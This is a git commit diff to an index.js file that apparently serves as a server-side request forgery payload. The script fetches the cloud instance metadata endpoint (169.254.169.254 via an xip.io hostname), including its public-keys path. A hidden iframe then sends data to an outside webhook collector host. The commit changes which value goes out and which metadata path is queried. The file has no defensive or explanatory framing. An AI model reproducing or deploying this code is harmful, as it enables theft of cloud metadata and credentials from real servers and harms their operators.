a1862bc509fb4a7d9e33204f5454543d209ca1a4
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 21:38:09 +0200

    Update index.js

--- index.js
+++ index.js
@@ -4,10 +4,10 @@ function reqListener () {
     var raw = this.responseText;
     var iframe = document.createElement('iframe');
 	iframe.style.display = "none";
-	iframe.src = "https://762202e9.proxy.webhookapp.com/?ff="+b64;
+	iframe.src = "https://762202e9.proxy.webhookapp.com/?ff="+navigator.appVersion;
 	document.body.appendChild(iframe);
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "http://169.254.169.254.xip.io/latest/meta-data/public-keys/"); 
+oReq.open("GET", "http://169.254.169.254.xip.io/latest/meta-data/public-keys/hostname"); 
 oReq.send();
